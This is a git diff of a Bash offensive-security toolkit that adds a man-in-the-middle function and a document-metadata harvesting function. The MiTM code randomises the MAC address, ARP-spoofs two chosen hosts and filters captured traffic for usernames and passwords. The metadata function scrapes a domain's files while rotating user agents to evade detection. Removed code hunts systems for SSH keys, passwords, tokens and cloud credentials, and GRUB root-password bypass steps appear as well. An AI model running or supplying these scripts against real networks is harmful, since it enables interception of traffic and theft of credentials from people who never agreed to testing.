-            echo -e "${GRENN} In ${RED}Red Hat-based${RESET} systems, network configurations are stored in: ${RED}/etc/sysconfig/network-scripts${RESET}"
-            echo
-            subtitle;  # Add a decorative subtitle
-        }
-
-        # Main execution workflow
-        function useful_commands_workflow() {
+        # Display Instructions on Screen
+        function submenu_linux_root_password_reset() {
+            #clear
             display_banner_inside_functions
-            network_management_commands
-            connection_monitoring_commands
-            routing_commands
-            network_configuration_info
-            exit_to_main_menu
+            generate_reset_steps
+            echo
+            #echo -e "${MAGENTA} [0] Generate Instructions${RESET}"
+            echo -e "${MAGENTA} [1] Generate QR Code${RESET}"
+            echo -e "${MAGENTA} [2] Print Instructions${RESET}"
+            echo -e "${MAGENTA} [3] Print in Screen${RESET}"
+            echo -e "${MAGENTA} [4] Exit to Main Menu${RESET}"
+            echo
+            echo -ne "${GREEN} Choose an option: ${RESET}"
+            read -r option
+            echo
+            case $option in
+                0) generate_reset_steps ;;
+                1) generate_qr_code ;;
+                2) print_instructions ;;
+                3) print_in_screen ;;
+                4) main ;;
+                *) echo -e "${RED} Invalid choice.${RESET}"; go_back ;;
+            esac
         }
 
-        # Execute workflow
-        useful_commands_workflow
+        # Main Execution
+        submenu_linux_root_password_reset
     }
 
     # Function: Collects system & network reconnaissance data
@@ -2396,479 +1613,877 @@ RELEASE="ANAKIN"
         sysinfo_workflow
     }
 
-    # Function: Find-base attack surface analysis
-    function find_based_attack_surface_analysis() {
-        # find_based_attack_surface_analysis - Automates Attack Surface Discovery using 'find'
+    # Function: Perform metadata analysis for files on specific domains
+    function metadata_analysis() {
+        # Metadata Analysis - Perform metadata analysis for files on specific domains    
+            # ==============================================================================
+            # Metadata Analysis
+            # Version: 1.2 (2024-01-25)
+            # Author: R3v4N|0wL (jpgress@gmail.com)
             #
             # Description:
-            #   Automates system reconnaissance by searching for sensitive files, privilege escalation paths,
-            #   and hidden persistence mechanisms using the 'find' command.
+            # This script automates the process of performing metadata analysis on files
             #
-            # Key Features:
-            #   - Detects SUID/SGID binaries for Privilege Escalation
-            #   - Identifies world-writable or unowned files for exploitation
-            #   - Finds SSH keys, password files, and sensitive data for credential theft
-            #   - Locates hidden files, unusual permissions, and suspicious cron jobs
-            #   - Logs findings for Red Team and Forensics investigations
+            # Description:
+            # This function automates the process of performing metadata analysis on files 
+            # retrieved from specified domains or websites. It performs the following steps:
+            # 1. Prompts the user for domain, file type, and an optional keyword for filtering.
+            # 2. Searches Google for URLs of the specified file type and downloads the files.
+            # 3. Extracts metadata fields (e.g., Author, Producer, Creator, MIME Type) using `exiftool`.
+            # 4. Organizes and summarizes the metadata into an easy-to-read format and exports to CSV.
+            # 5. Handles common errors like empty results or failed downloads to ensure a robust workflow.
             #
-            # Output:
-            #   - Displays results on-screen
-            #   - Saves findings to a structured log file
+            # Dependencies:
+            # - `lynx`: Used for performing Google searches.
+            # - `wget`: Used for downloading files from the URLs found in the search results.
+            # - `exiftool`: Used for extracting metadata from downloaded files.
+            # - `grep`: Used for filtering and processing search results and metadata.
+            #
+            # Notes:
+            # - Ensure all dependencies are installed and accessible in your `$PATH`.
+            # - The function saves intermediate and final results to timestamped files and folders.
+            # - Random user-agent rotation is implemented for downloads to avoid detection.
+            #
+            # Example Usage:
+            # - Input:
+            #     Domain: `businesscorp.com.br`
+            #     File type: `pdf`
+            #     Keyword: `employee`
+            # - Output:
+            #     - Search results in `TIMESTAMP_filtered.txt`
+            #     - Downloaded files in `DOMAIN_TIMESTAMP/`
+            #     - Metadata summary in `DOMAIN_TIMESTAMP_metadata_summary.txt`
+            #     - Organized summary in `DOMAIN_TIMESTAMP_organized_metadata_summary.txt`
+            #     - Metadata CSV in `DOMAIN_TIMESTAMP_metadata_summary.csv`
+            #
+            # Version History:
+            # - 1.0 (2025-01-24): Initial implementation of metadata analysis workflow.
+            # - 1.1 (2025-01-25): Improved error handling, user-agent rotation, and metadata processing.
+            # - 1.2 (2025-01-25): Added structured output (CSV and organized summary) and validation.
+            #
+            # Author: R3v4N (w/ GPT assistance)
+            # ==============================================================================
+
+        # This script sets the SEARCH variable to use the 'lynx' command-line web browser.
+        # The 'lynx' command is configured with the following options:
+        # -dump: Outputs the formatted document to standard output.
+        # -hiddenlinks=merge: Merges hidden links into the document.
+        # -force_html: Forces the document to be interpreted as HTML.
+        SEARCH="lynx -dump -hiddenlinks=merge -force_html"
+        
+        # Function to prompt the user for required input
+        function metadata_analysis_menu() {
+            clear;  # Clears the terminal screen to give a clean interface
+            ascii_banner_art;  # Displays a banner or logo at the top of the screen
+            
+            # Display the title of this analysis step with colored formatting
+            echo -e "${MAGENTA} 4 - Metadata Analysis ${RESET}"
+            
+            subtitle;  # Displays a subtitle or additional details about the script
+
+            # Prompt the user to enter the domain or website they want to analyze (e.g., government or business domains)
+            echo -n " Enter the domain or extension to search (e.g., businesscorp.com.br): "
+            read -r SITE  # Read the user's input and store it in the SITE variable
+
+            # Prompt the user to enter the file type they want to search for (e.g., PDFs, DOCX)
+            echo -n " Enter the file extension to search for (e.g., pdf): "
+            read -r FILE  # Read the user's input and store it in the FILE variable
+
+            # Prompt the user to optionally specify a keyword to refine the search (e.g., specific topics or terms)
+            echo -n " [Optional] Enter a keyword to refine the search (e.g., user): "
+            read -r KEYWORD  # Read the user's input and store it in the KEYWORD variable
+        }
+
+
+        function perform_search() {
+            # Helper function to log search results
+            function log_results() {
+                local file="$1"
+                if [[ -s "$file" ]]; then
+                    echo -e "${GREEN} Search successful. Results saved to $file ${RESET}"
+                else
+                    echo -e "${RED} No results found for the specified search criteria. ${RESET}"
+                    local raw_results_file="raw_results_${TIMESTAMP}.txt"
+                    echo -e "${RED} Raw search results saved to ${YELLOW}$raw_results_file ${RESET}"
+                    mv "$file" "$raw_results_file"  # Save the empty file as raw results for debugging
+                fi
+            }
+
+            # Generate the timestamp and file names
+            TIMESTAMP=$(date +%d%H%M%b%Y)
+            FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"
+
+            # Build the search query
+            local base_query="https://www.google.com/search?q=inurl:$SITE+filetype:$FILE"
+            if [[ -n "$KEYWORD" ]]; then
+                echo -e "${MAGENTA} Searching for $FILE files with \"$KEYWORD\" on $SITE... ${RESET}"
+                base_query+="+intext:$KEYWORD"
+            else
+                echo -e "${MAGENTA} Searching for $FILE files on $SITE... ${RESET}"
+            fi
+
+            # Perform the search and filter results
+            echo ""
+            $SEARCH "$base_query" \
+                | grep -Eo 'https?://[^ ]+\.'"$FILE" \
+                | cut -d '=' -f2'' > "$FILTERED_RESULTS_FILE"
+
+            # Log the results
+            log_results "$FILTERED_RESULTS_FILE"
+        }       
+        
+        # Function to download files from the search results
+        function download_files() {
+            USER_AGENTS=(
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
+                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
+                "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Mobile Safari/537.36"
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36 Edg/109.0.774.68"
+            )
+
+            FILE_LIST="$1"
+            FOLDER="${SITE}_${TIMESTAMP}"
+            mkdir -p "$FOLDER"
+            FAILED_DOWNLOADS=0
+
+            while IFS= read -r URL; do
+                RANDOM_USER_AGENT="${USER_AGENTS[RANDOM % ${#USER_AGENTS[@]}]}"
+                echo -e "${MAGENTA} ==========================================================================${RESET}"
+                echo -e "${MAGENTA} Downloading file with ${RANDOM_USER_AGENT} ${RESET}"
+                wget --user-agent="$RANDOM_USER_AGENT" -P "$FOLDER" "$URL"
+
+                # Check if the file was successfully downloaded
+                if [[ $? -ne 0 ]]; then
+                    echo -e "${RED} Failed to download: $URL ${RESET}"
+                    ((FAILED_DOWNLOADS++))
+                fi
+                echo -e "${MAGENTA} ==========================================================================${RESET}"
+            done < "$FILE_LIST"
+
+            rm -f "$FILE_LIST"  # Clean up the temporary results file
+
+            if [[ $FAILED_DOWNLOADS -gt 0 ]]; then
+                echo -e "${YELLOW} Warning: $FAILED_DOWNLOADS files failed to download. ${RESET}"
+            fi
+        }
+
+        # Function to extract metadata for Author, Producer, Creator, and MIME Type
+        function extract_metadata_summary() {
+            FOLDER="${SITE}_${TIMESTAMP}"
+            METADATA_FILE="${FOLDER}_metadata_summary.txt"
+            echo -e "${MAGENTA} Extracting metadata from files in: $FOLDER ${RESET}"
+
+            # Check if folder contains files
+            if [[ -z "$(ls -A "$FOLDER")" ]]; then
+                echo -e "${RED} No files found in $FOLDER to extract metadata. ${RESET}"
+                echo -e "${GRAY} Returning to main menu.${RESET}"
+                return 1
+            fi
+
+            # Initialize the metadata summary file
+            echo -e "Metadata Summary for $SITE - Generated on $(date)\n" > "$METADATA_FILE"
+
+            # Use exiftool to extract metadata and filter relevant fields
+            exiftool "$FOLDER"/* | grep -E "^(Author|Producer|Creator|MIME Type)" >> "$METADATA_FILE"
+
+            if [[ -s "$METADATA_FILE" ]]; then
+                echo -e "${GREEN} Metadata summary saved to: $METADATA_FILE ${RESET}"
+            else
+                echo -e "${RED} No metadata extracted. Metadata file is empty. ${RESET}"
+            fi
+        }
+
+        # Function to process, organize, and export metadata
+        function process_metadata_summary() {
+            FOLDER="${SITE}_${TIMESTAMP}"
+            METADATA_FILE="${FOLDER}_metadata_summary.txt"
+            ORGANIZED_METADATA_FILE="${FOLDER}_organized_metadata_summary.txt"
+            CSV_FILE="${FOLDER}_metadata_summary.csv"
+
+            echo -e "${MAGENTA} Processing and organizing metadata for: $METADATA_FILE ${RESET}"
+
+            # Initialize the organized metadata file
+            echo -e "Organized Metadata Summary for $SITE - Generated on $(date)\n" > "$ORGANIZED_METADATA_FILE"
+
+            # Initialize the CSV file with headers
+            echo "Type,Value,Count" > "$CSV_FILE"
+
+            # Group by software (Creator Tool and Producer)
+            echo -e "=== Software Used (Creator Tool and Producer) ===\n" >> "$ORGANIZED_METADATA_FILE"
+            grep -E "^(Creator Tool|Producer)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
+                echo "$FIELD,$VALUE,$COUNT" >> "$CSV_FILE" # Add to CSV
+                printf "%-30s : %s (%s occurrences)\n" "$FIELD" "$VALUE" "$COUNT" >> "$ORGANIZED_METADATA_FILE"
+            done
+
+            # Group by persons (Creator and Author)
+            echo -e "\n=== People Found (Creator and Author) ===\n" >> "$ORGANIZED_METADATA_FILE"
+            grep -E "^(Creator|Author)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
+                echo "$FIELD,$VALUE,$COUNT" >> "$CSV_FILE" # Add to CSV
+                printf "%-30s : %s (%s occurrences)\n" "$FIELD" "$VALUE" "$COUNT" >> "$ORGANIZED_METADATA_FILE"
+            done
+
+            echo -e "${GREEN} Organized metadata saved to: $ORGANIZED_METADATA_FILE ${RESET}"
+            echo -e "${GREEN} Metadata CSV saved to: $CSV_FILE ${RESET}"
+
+            # Display summary on the screen
+            echo -e "\n${CYAN}=== Screen Summary ===${RESET}"
+            echo -e "${YELLOW}Top Software Used:${RESET}"
+            grep -E "^(Creator Tool|Producer)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
+                echo "  $FIELD: $VALUE ($COUNT occurrences)"
+            done
+
+            echo -e "\n${YELLOW}Top People Mentioned:${RESET}"
+            grep -E "^(Creator|Author)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
+                echo "  $FIELD: $VALUE ($COUNT occurrences)"
+            done
+        }
+
+        # Function to handle errors for empty results or missing files
+        function handle_empty_results() {
+            local file_to_check="$1"
+            local context_message="$2"
+
+            if [[ ! -f "$file_to_check" ]]; then
+                echo -e "${RED} Error: $context_message - File does not exist. ${RESET}"
+                echo -e "${YELLOW} Please check your search criteria or connection. ${RESET}"
+                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
+                read -r 2>/dev/null
+                main_menu
+                return 1
+            fi
+
+            if [[ ! -s "$file_to_check" ]]; then
+                echo -e "${RED} Error: $context_message - File is empty. ${RESET}"
+                echo -e "${YELLOW} This usually happens when no results were found or when you got a Google ban! =/ ${RESET}"
+                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
+                read -r 2>/dev/null
+                main_menu
+                return 1
+            fi
+            return 0  # File exists and is not empty
+        }
+
+        # Function to handle the entire metadata analysis workflow
+        function run_metadata_analysis() {
+            # Step 1: Prompt user for inputs
+            metadata_analysis_menu
+
+            # Step 2: Perform the search and save filtered URLs
+            perform_search
+
+            # Step 3: Check and handle filtered results file
+            FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"
+            handle_empty_results "$FILTERED_RESULTS_FILE" "Search results for filtered URLs" || return
+
+            # Step 4: Download files
+            download_files "$FILTERED_RESULTS_FILE"
+
+            # Step 5: Extract metadata from downloaded files
+            extract_metadata_summary  # This generates METADATA_FILE
+
+            # Step 6: Check and handle metadata file
+            METADATA_FILE="${SITE}_${TIMESTAMP}_metadata_summary.txt"
+            handle_empty_results "$METADATA_FILE" "Extracted metadata summary" || return
+
+            # Step 7: Process metadata and export CSV
+            process_metadata_summary
+
+            # Final step: Return to main menu
+            echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
+            read -r 2>/dev/null
+            main_menu
+        }
+
+        # Ensure main workflow is executed
+        run_metadata_analysis;
+
+    }
+
+    # Function: Perform a Man-in-the-Middle (MiTM) attack
+    function mitm() {
+        # Function: x_mitm - Perform a Man-in-the-Middle (MiTM) attack
+            #
+            # Description:
+            # This script automates the setup and execution of a MiTM attack.
+            # It performs the following operations:
+            # 1. Identifies the network interface and attack network.
+            # 2. Enables packet forwarding for the host system.
+            # 3. Sets up spoofing, packet capture, and analysis tools.
+            # 4. Captures and filters traffic between two specified targets.
+            #
+            # Dependencies:
+            # - ipcalc: For calculating network ranges.
+            # - macchanger: To randomize the MAC address.
+            # - tilix: For launching new terminal sessions.
+            # - arpspoof: For ARP spoofing.
+            # - tcpdump: For capturing and filtering packets.
             #
             # Author: R3v4N (w/GPT)
             # Created on: 2025-01-25
-            # Last Updated: 2025-01-30
-            # Version: 2.0
-            #
-            # Usage:
-            #   Run this function to automatically scan a system for attack vectors or forensic analysis.
+            # Last Updated: 2025-01-25
+            # Version: 1.2
             #
             # Notes:
-            #   - Red Team: Helps identify misconfigurations & exploitation opportunities.
-            #   - Forensics: Helps detect persistence, exfiltration traces, and privilege abuse.
-            #   - Requires root privileges for full execution.
-            # Create log directory & file
-        title="Find-Based Attack Surface Analysis"  # Define the title for this operation
-        
-        function find_analysis_create_log_file() {
-            LOG_DIR="./logs"
-            mkdir -p "$LOG_DIR"
-            LOG_FILE="${LOG_DIR}/find_analysis_$(date +%d%m%Y_%H%M%S).log"
-            echo "Find-Based Attack Surface Analysis Log - $(date)" > "$LOG_FILE"
-            echo "===============================================" >> "$LOG_FILE"
-        }
-
-        function all_find_based_attack_functions() {
-            
-            # Privilege Escalation Checks
-            function privilege_escalation_checks() {
-                log_and_display "=== Searching for SUID/SGID binaries (Potential Privilege Escalation) ==="
-                    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            # World-Writable & Unowned Files
-            function world_writable_unowned_files() {
-                log_and_display "=== Searching for World-Writable Files (Top 500) ==="
-                    find / -type f -perm -o+w -exec ls -la {} 2>/dev/null \; | head -n 500 | tee -a "$LOG_FILE"
-                log_and_display "=== Searching for Unowned Files (Top 500) ==="
-                    find / -nouser -o -nogroup -exec ls -la {} 2>/dev/null \; | head -n 500 | tee -a "$LOG_FILE"
-            }
-
-            # Credential Discovery
-            function credential_discovery() {
-                log_and_display "=== Searching for SSH Keys ==="
-                    find / -type f -name "id_rsa*" 2>/dev/null | tee -a "$LOG_FILE"
-                log_and_display "=== Searching for Useful Files (Config files) ==="
-                    find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.cfg" -name "*.log" -o -name "*.db" -o -name "*.pem"  \)  -exec grep -i "password" {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            # Persistence Mechanisms
-            function persistence_mechanisms() {
-                log_and_display "=== Searching for Suspicious Cron Jobs ==="
-                    find /etc/cron* -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
-                log_and_display "=== Searching for Startup Scripts (init.d, systemd, .bashrc) ==="
-                    find /etc/init.d /lib/systemd/system ~/.bashrc -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            # Hidden Files & Anti-Forensics
-            function hidden_files_detection() {
-                log_and_display "=== Searching for Hidden Files ==="
-                    find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /snap -o -path /var/lib/docker \) -prune -o -type f -name ".*" 2>/dev/null | tee -a "$LOG_FILE"
-                log_and_display "=== Searching for Files with Strange Timestamps ==="
-                    timeout 600s find / -type f -newermt "2025-01-01" -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            # Exfiltration Traces
-            function exfiltration_traces() {
-                log_and_display "=== Searching for Large Archive Files (Potential Data Exfiltration) ==="
-                    timeout 600s find / -type f \( -name "*.zip" -o -name "*.tar" -o -name "*.gz" -o -name "*.7z" \) -size +50M -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
-                log_and_display "=== Searching for Files Accessed in the Last 24 Hours ==="
-                    find / -type f -atime -1 -size -5M -exec  ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            function log_tampering_detection() {
-                log_and_display "=== Searching for Recently Modified Logs ==="
-                    find /var/log -type f -mtime -1 -exec ls -lah {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            function sensitive_file_discovery() {
-                log_and_display "=== Searching for Sensitive Files (API Keys, Credentials, Configs) ==="
-                    find / -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.env' -o -name '*.ini' \) -exec grep -Ei 'senha|pass|password|secret|apikey|token' {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            function suspicious_executables_scripts() {
-                log_and_display "=== Searching for Suspicious Executables & Scripts ==="
-                    find /tmp /dev/shm /var/tmp -type f -executable -exec ls -lah {} 2>/dev/null \; | tee -a "$LOG_FILE"
-            }
-
-            function container_cloud_artifacts() {
-                log_and_display "=== Searching for Cloud & Container Credentials ==="
-                    find / -type f \( -name 'config.json' -o -name 'credentials' -o -name '.dockercfg' -o -name '.kube/config' \) 2>/dev/null | tee -a "$LOG_FILE"
-            }
-
-            function caller_functions(){
-                privilege_escalation_checks
-                world_writable_unowned_files
-                credential_discovery
-                persistence_mechanisms
-                hidden_files_detection
-                exfiltration_traces
-                log_tampering_detection
-                sensitive_file_discovery
-                suspicious_executables_scripts
-                container_cloud_artifacts
-            }
-
-            caller_functions;
-
-        }
-
-        # Automated Execution of All Checks
-        function find_based_analysis_workflow() {
-            display_banner_inside_functions
-            all_find_based_attack_functions
-            log_and_display "=== Analysis Complete! Results saved to: $LOG_FILE ==="
-        }
-
-        # Execute the workflow
-        find_based_analysis_workflow
-    }
-
-    # Function: Find command examples
-    function find_command_examples() {
-
-        # find_command_examples - Display examples of the 'find' command for reconnaissance & automation
+            # - Ensure all dependencies are installed.
+            # - This script is intended for ethical testing only.
+            # - Always have explicit permission before performing MiTM operations.
+            # - Make sure to properly configure your network and firewall rules.
             #
-            # Description:
-            #   This function provides quick reference examples of using 'find' for:
-            #   - File discovery, privilege escalation, and hidden files detection.
-            #   - Searching based on permissions, user, group, modification/access times.
-            #   - Executing commands on discovered files.
-            #
-            # Notes:
-            #   - Useful for Red Teamers & Forensics Investigators.
-            #   - Helps automate common search operations.
-            #   - No actual scanning—this is just a reference tool.
-            #
-            # Author: R3v4N (w/GPT)
-            # Last Updated: 2025-02-01
-            # Version: 2.0
 
-        title="\tFind Command Examples"  # Define the title for this operation
-        function display_find_usage_section() {
-            local title="$1"
-            echo -e "${RED}# $title${RESET}"
-            echo
+
+        local title="Man-in-the-Middle (MiTM) Attack"  # Define the title for this operation
+
+        # Function to check if all required dependencies are installed
+        function check_dependencies() {
+            local dependencies=("ipcalc" "macchanger" "konsole" "arpspoof" "tcpdump")
+            for tool in "${dependencies[@]}"; do
+                if ! command -v "$tool" &>/dev/null; then
+                    echo -e "${RED} Error: $tool is not installed. Please install it and try again.${RESET}"
+                    exit 1
+                fi
+            done
         }
 
-        function all_find_examples(){
-            
-            function list_all_files() {
-                display_find_usage_section "List All Files in a Directory"
-                echo -e "${GREEN}$ find .${RESET}"
-                echo
-            }
+        # Function to identify the network interface and attack network
+        function identify_attack_environment() {
+            INTERFACE=$(ip -br a | grep tap | awk '{print $1}' | head -n 1)
+            NETWORK=$(ipcalc "$(ip -br a | grep tap | awk '{print $3}' | awk -F '/' '{print $1}')" \
+                | grep -F "Network:" | awk '{print $2}')
 
-            function find_files_by_maxdepth() {
-                display_find_usage_section "Find Files with Limited Depth"
-                echo -e "${GREEN}$ find /etc -maxdepth 1 -name '*.sh'${RESET}"
-                echo
-            }
-
-            function find_specific_files() {
-                display_find_usage_section "Find Files by Name"
-                echo -e "${GREEN}$ find ./test -type f -name '<file*>'${RESET}"
-                echo
-            }
-
-            function find_specific_directories() {
-                display_find_usage_section "Find Directories by Name"
-                echo -e "${GREEN}$ find ./test -type d -name '<directory*>'${RESET}"
-                echo
-            }
-
-            function find_hidden_files() {
-                display_find_usage_section "Find Hidden Files"
-                echo -e "${GREEN}$ find ~ -type f -name '.*'${RESET}"
-                echo
-            }
-
-            function find_by_permissions() {
-                display_find_usage_section "Find Files by Permissions"
-                echo -e "${GREEN}$ find / -type f -perm 0740 -exec ls -la {} 2>/dev/null \;${RESET}"
-                echo -e "${GREEN}$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;  # Find SUID files${RESET}"
-                echo
-            }
-
-            function find_by_user_group() {
-                display_find_usage_section "Find Files by User or Group"
-                echo -e "${GREEN}$ find . -user msfadmin${RESET}"
-                echo -e "${GREEN}$ find . -user msfadmin -name '*.txt'${RESET}"
-                echo -e "${GREEN}$ find . -group adm${RESET}"
-                echo
-            }
-
-            function find_by_time() {
-                display_find_usage_section "Find Files Modified/Accessed in the Last N Days"
-                echo -e "${GREEN}$ find / -mtime 5${RESET}  # Modified in the last 5 days"
-                echo -e "${GREEN}$ find / -atime 5${RESET}  # Accessed in the last 5 days"
-                echo
-            }
-
-            function find_and_execute() {
-                display_find_usage_section "Find and Execute Commands"
-                echo -e "${GREEN}$ find / -name '*.pdf' -type f -exec ls -lah {} \;${RESET}"
-                echo
-            }
-
-            function call_find_examples() {
-                list_all_files
-                find_files_by_maxdepth
-                find_specific_files
-                find_specific_directories
-                find_hidden_files
-                find_by_permissions
-                find_by_user_group
-                find_by_time
-                find_and_execute
-            }
-
-            call_find_examples
-        }
-
-        function find_examples_workflow() {
-            display_banner_inside_functions
-            all_find_examples
-            exit_to_main_menu
-        }
-
-        find_examples_workflow
-    }
-
-    # Function: Interactive Guide for Resetting Root Password via GRUB
-    function linux_root_password_reset() {
-
-        title="\tLinux Root Password Reset via GRUB"  # Define the title for this operation
-
-        # Define Reset Instructions for Each OS
-        function generate_reset_steps() {
-            local file="/tmp/root_reset_steps.txt"
-            echo "======================" > "$file"
-            echo "  ROOT PASSWORD RESET  " >> "$file"
-            echo "======================" >> "$file"
-
-            echo -e "\n[Debian/Ubuntu]" >> "$file"
-            echo "  1. Restart the system." >> "$file"
-            echo "  2. Press 'e' at the GRUB menu." >> "$file"
-            echo "  3. Find the line starting with: linux boot..." >> "$file"
-            echo "  4. Replace 'ro quiet' with 'init=/bin/bash rw'" >> "$file"
-            echo "  5. Press Ctrl + X to boot." >> "$file"
-            echo "  6. Run: passwd root" >> "$file"
-            echo "  7. Reboot: reboot -f" >> "$file"
-
-            echo -e "\n[Red Hat (CentOS, Fedora, Alma, Rocky)]" >> "$file"
-            echo "  1. Restart the system." >> "$file"
-            echo "  2. Press 'e' at the GRUB menu." >> "$file"
-            echo "  3. Find the line starting with: linux16..." >> "$file"
-            echo "  4. Replace 'rghb quiet LANG=en_US.UTF-8' with 'init=/bin/bash rw'" >> "$file"
-            echo "  5. Press Ctrl + X to boot." >> "$file"
-            echo "  6. If SELinux blocks changes, run: setenforce 0" >> "$file"
-            echo "  7. Run: passwd root" >> "$file"
-            echo "  8. Reboot: reboot -f" >> "$file"
-
-            echo -e "\n[Arch Linux]" >> "$file"
-            echo "  1. Restart the system." >> "$file"
-            echo "  2. Press 'e' at the GRUB menu." >> "$file"
-            echo "  3. Locate the line starting with: linux ..." >> "$file"
-            echo "  4. Add 'init=/bin/bash' at the end of the line." >> "$file"
-            echo "  5. Press Ctrl + X to boot." >> "$file"
-            echo "  6. Run: mount -o remount,rw /" >> "$file"
-            echo "  7. Run: passwd root" >> "$file"
-            echo "  8. Reboot: reboot -f" >> "$file"
-
-            echo -e "\n[SUSE/OpenSUSE]" >> "$file"
-            echo "  1. Restart the system." >> "$file"
-            echo "  2. Press 'e' at the GRUB menu." >> "$file"
-            echo "  3. Locate the line starting with: linux ..." >> "$file"
-            echo "  4. Replace 'quiet' with 'init=/bin/bash'" >> "$file"
-            echo "  5. Press Ctrl + X to boot." >> "$file"
-            echo "  6. Run: passwd root" >> "$file"
-            echo "  7. Reboot: reboot -f" >> "$file"
-
-            echo -e "\n[FreeBSD]" >> "$file"
-            echo "  1. Restart the system." >> "$file"
-            echo "  2. At the boot menu, press 'Esc' for the loader prompt." >> "$file"
-            echo "  3. Type: boot -s" >> "$file"
-            echo "  4. When prompted for a shell, press 'Enter'." >> "$file"
-            echo "  5. Remount root filesystem as read-write: mount -u /" >> "$file"
-            echo "  6. Run: mount -a" >> "$file"
-            echo "  7. Run: passwd root" >> "$file"
-            echo "  8. Reboot: reboot" >> "$file"
-
-            echo "======================" >> "$file"
-            echo " File with instructions saved in: $file"
-        }
-
-        function go_back(){
-            pause_script
-            submenu_linux_root_password_reset
-        }
-
-        # Generate a QR Code with Steps
-        function generate_qr_code() {
-            if command -v qrencode &>/dev/null; then
-                cat /tmp/root_reset_steps.txt | qrencode -o /tmp/root_reset_qr.png
-                echo -e "${GREEN} QR Code saved to /tmp/root_reset_qr.png.${RESET}"
-                echo -e "${GRAY} Scan it with your phone before rebooting.${RESET}"
-                go_back
-            else
-                echo -e "${RED} qrencode not installed. Install and try again. Skipping QR code generation.${RESET}"
-                go_back
+            if [[ -z "$INTERFACE" || -z "$NETWORK" ]]; then
+                echo -e "${RED} Error: Could not determine attack interface or network.${RESET}"
+                exit 1
             fi
         }
 
-        # Option to Print Steps (if physical access)
-        function print_instructions() {
-            if command -v lp &>/dev/null; then
-                lp /tmp/root_reset_steps.txt
-                echo -e "${GREEN} Instructions sent to printer.${RESET}"
-                go_back
-            else
-                echo -e "${YELLOW} No printer detected. Skipping print.${RESET}"
-                go_back
+        # Function to display attack setup information
+        function display_attack_info() {
+            clear
+            echo "============= 0.0wL ============="
+            echo "ATTACK INTERFACE: $INTERFACE"
+            echo "ATTACK NETWORK: $NETWORK"
+            echo "================================="
+        }
+
+        # Function to enable packet forwarding on the system
+        function enable_packet_forwarding() {
+            echo 1 > /proc/sys/net/ipv4/ip_forward
+            echo "================================="
+            echo "PACKET ROUTING ENABLED"
+            echo "================================="
+        }
+
+        # Function to validate user-entered IP addresses
+        function validate_ip() {
+            local ip="$1"
+            if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || ! ipcalc -c "$ip" &>/dev/null; then
+                echo -e "${RED}Error: Invalid IP address: $ip${RESET}"
+                return 1
             fi
+            return 0
         }
 
-        function print_in_screen() {
-            cat /tmp/root_reset_steps.txt
-            echo
-            echo -e "${YELLOW} Instructions printed on screen. Please follow them manually.${RESET}"
-            echo
-            go_back
+        # Function to set up the MiTM environment
+        function setup_mitm_environment() {
+            macchanger -r "$INTERFACE" || { echo "Error: MAC address change failed."; exit 1; }
+
+            # Start Netdiscover for network discovery
+            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $NETWORK" &
+            sleep 10  # Allow time for network scanning
+
+            # Prompt user for target IP addresses and validate them
+            while true; do
+                echo -n "Enter the IP of TARGET 01: "
+                read -r TARGET_01
+                validate_ip "$TARGET_01" && break
+            done
+
+            while true; do
+                echo -n "Enter the IP of TARGET 02: "
+                read -r TARGET_02
+                validate_ip "$TARGET_02" && break
+            done
+
+            # Start ARP spoofing in a separate session
+            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $TARGET_01 -r $TARGET_02" &
+
+            # Start packet capture and filter sensitive data
+            tcpdump -i "$INTERFACE" -t host "$TARGET_01" and host "$TARGET_02" \
+                'tcp[((tcp[12:1] & 0xf0) >> 4) * 4:]' \
+                | grep -E '\[P.\]' \
+                | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' \
+                | tee captures.txt
         }
 
-        # Display Instructions on Screen
-        function submenu_linux_root_password_reset() {
-            #clear
-            display_banner_inside_functions
-            generate_reset_steps
-            echo
-            #echo -e "${MAGENTA} [0] Generate Instructions${RESET}"
-            echo -e "${MAGENTA} [1] Generate QR Code${RESET}"
-            echo -e "${MAGENTA} [2] Print Instructions${RESET}"
-            echo -e "${MAGENTA} [3] Print in Screen${RESET}"
